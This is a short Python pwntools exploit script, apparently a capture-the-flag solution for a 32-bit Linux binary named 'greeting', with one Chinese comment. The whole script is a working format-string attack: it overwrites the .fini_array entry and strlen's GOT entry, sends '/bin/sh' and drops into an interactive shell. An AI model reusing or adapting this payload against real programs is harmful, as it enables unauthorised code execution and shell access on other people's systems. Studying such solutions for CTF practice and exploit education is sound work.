'''
Author: Samrito
Date: 2022-02-09 20:17:57
LastEditors: Samrito
LastEditTime: 2022-02-09 21:07:28
'''

from pwn import *

context.arch = 'i386'
context.os = 'linux'
context.log_level = 'debug'

io = process(argv=['./greeting'])

#0x08049934 - 0x08049938 is .fini_array <- 0x08048614
#0x08049a28 - 0x08049a60 is .got.plt

#0x08049a54 is strlen got addr <- 0x08048490
#0x08048614 is back addr
fini_addr = 0x08049934
strlen_got_addr = 0x08049a54
io.recvuntil(b'Please tell me your name')
# 这里对同样的0x804放在一起处理，减少需要传输的字符串（不合并输入字符串也过长）
payload = flat([
    b'@@', fini_addr, fini_addr + 2, strlen_got_addr, strlen_got_addr + 2,
    b'%34288c', b'%12$n', b'%65148c', b'%14$n', b'%33652c', b'%13$n', b'%15$n'
])
io.sendline(payload)
io.sendline(b'/bin/sh')
io.interactive()
